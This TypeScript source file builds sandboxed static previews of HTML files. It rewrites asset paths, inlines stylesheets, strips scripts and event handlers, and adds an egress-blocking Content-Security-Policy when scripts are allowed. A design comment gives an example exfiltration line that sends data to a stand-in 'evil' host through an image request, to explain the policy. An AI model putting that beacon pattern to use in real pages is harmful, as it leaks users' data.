import { resolveAgainstCwd } from '@/lib/file-path'

type ResolveAsset = (baseDir: string, value: string) => string | null

export interface StaticHtmlPreviewOptions {
  html: string
  fileDir: string
  resolveAsset: ResolveAsset
  readTextAsset: (absPath: string) => string | undefined
  /** Artifact scope only ([spec:SP-0fc9]): keep scripts so an agent-authored prototype is
   *  actually clickable. The iframe grants allow-scripts (opaque origin — no app DOM, no
   *  cookies, no storage) and the CSP below blocks egress. Every other scope stays static:
   *  a worktree .html is arbitrary content (node_modules, fetched fixtures), not a deliverable. */
  allowScripts?: boolean
  /** Origin serving this artifact's subresources; the only one the CSP admits. */
  assetOrigin?: string
}

/** Pinned subresources + no connect-src: a script may run, but it has nothing to phone home
 *  with. `img-src *` would reopen exfiltration via `new Image().src = 'https://evil/?'+data`. */
function interactiveCsp(assetOrigin: string | undefined): string {
  const subresource = [assetOrigin, 'data:', 'blob:'].filter(Boolean).join(' ')
  return [
    "default-src 'none'",
    "script-src 'unsafe-inline' 'unsafe-eval'",
    "style-src 'unsafe-inline'",
    `img-src ${subresource}`,
    `media-src ${subresource}`,
    `font-src ${[assetOrigin, 'data:'].filter(Boolean).join(' ')}`,
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
  ].join('; ')
}

const REMOTE_OR_SPECIAL = /^(https?:|data:|blob:|mailto:|tel:|#|\/\/)/i

function shouldRewrite(value: string | null): value is string {
  return !!value && !REMOTE_OR_SPECIAL.test(value.trim())
}

function dirOf(path: string): string {
  return path.replace(/\/[^/]*$/, '') || '/'
}

function neutralizeLinkHrefsForParsing(html: string): string {
  return html.replace(/<link\b[^>]*>/gi, (tag) => tag.replace(/\bhref\s*=/i, 'data-podium-href='))
}

function setLinkHref(link: HTMLLinkElement, value: string): void {
  link.setAttribute('href', value)
  link.removeAttribute('data-podium-href')
}

export function linkedStylesheetPathsForStaticHtml(html: string, fileDir: string): string[] {
  const parser = new DOMParser()
  const doc = parser.parseFromString(neutralizeLinkHrefsForParsing(html), 'text/html')
  const paths = new Set<string>()

  for (const link of Array.from(
    doc.querySelectorAll<HTMLLinkElement>('link[href], link[data-podium-href]'),
  )) {
    const href = link.getAttribute('data-podium-href') ?? link.getAttribute('href')
    if (!shouldRewrite(href)) continue
    const rel = (link.getAttribute('rel') ?? '').toLowerCase()
    if (rel.split(/\s+/).includes('stylesheet')) paths.add(resolveAgainstCwd(fileDir, href))
  }

  return Array.from(paths)
}

export function rewriteCssUrls(css: string, baseDir: string, resolveAsset: ResolveAsset): string {
  return css.replace(/url\((['"]?)([^'")]+)\1\)/g, (full, quote: string, raw: string) => {
    const value = raw.trim()
    if (!shouldRewrite(value)) return full
    const next = resolveAsset(baseDir, value)
    return next ? `url(${quote}${next}${quote})` : full
  })
}

export function buildStaticHtmlPreview(opts: StaticHtmlPreviewOptions): string {
  const parser = new DOMParser()
  const doc = parser.parseFromString(neutralizeLinkHrefsForParsing(opts.html), 'text/html')

  if (opts.allowScripts) {
    const meta = doc.createElement('meta')
    meta.setAttribute('http-equiv', 'Content-Security-Policy')
    meta.setAttribute('content', interactiveCsp(opts.assetOrigin))
    // First in <head>: a meta CSP only governs what follows it.
    doc.querySelector('head')?.prepend(meta)
  } else {
    for (const script of Array.from(doc.querySelectorAll('script'))) script.remove()
    for (const el of Array.from(doc.querySelectorAll('*'))) {
      for (const attr of Array.from(el.attributes)) {
        if (attr.name.toLowerCase().startsWith('on')) el.removeAttribute(attr.name)
      }
    }
  }

  for (const el of Array.from(doc.querySelectorAll<HTMLElement>('[style]'))) {
    const style = el.getAttribute('style')
    if (style) el.setAttribute('style', rewriteCssUrls(style, opts.fileDir, opts.resolveAsset))
  }
  for (const style of Array.from(doc.querySelectorAll('style'))) {
    style.textContent = rewriteCssUrls(style.textContent ?? '', opts.fileDir, opts.resolveAsset)
  }

  for (const el of Array.from(
    doc.querySelectorAll<
      HTMLImageElement | HTMLSourceElement | HTMLAudioElement | HTMLVideoElement
    >('img[src], source[src], audio[src], video[src]'),
  )) {
    const value = el.getAttribute('src')
    if (shouldRewrite(value)) {
      const next = opts.resolveAsset(opts.fileDir, value)
      if (next) el.setAttribute('src', next)
    }
  }

  for (const video of Array.from(doc.querySelectorAll<HTMLVideoElement>('video[poster]'))) {
    const value = video.getAttribute('poster')
    if (shouldRewrite(value)) {
      const next = opts.resolveAsset(opts.fileDir, value)
      if (next) video.setAttribute('poster', next)
    }
  }

  for (const link of Array.from(
    doc.querySelectorAll<HTMLLinkElement>('link[href], link[data-podium-href]'),
  )) {
    const href = link.getAttribute('data-podium-href') ?? link.getAttribute('href')
    if (!href) continue
    if (!shouldRewrite(href)) {
      setLinkHref(link, href)
      continue
    }
    const rel = (link.getAttribute('rel') ?? '').toLowerCase()
    const relParts = rel.split(/\s+/)

    if (relParts.includes('stylesheet')) {
      const cssPath = resolveAgainstCwd(opts.fileDir, href)
      const css = opts.readTextAsset(cssPath)
      if (css !== undefined) {
        const style = doc.createElement('style')
        style.setAttribute('data-podium-inlined-href', href)
        style.textContent = rewriteCssUrls(css, dirOf(cssPath), opts.resolveAsset)
        link.replaceWith(style)
      } else {
        setLinkHref(link, opts.resolveAsset(opts.fileDir, href) ?? href)
      }
      continue
    }

    if (relParts.some((part) => part === 'icon' || part.endsWith('icon'))) {
      setLinkHref(link, opts.resolveAsset(opts.fileDir, href) ?? href)
      continue
    }

    setLinkHref(link, href)
  }

  return `<!doctype html>\n${doc.documentElement.outerHTML}`
}
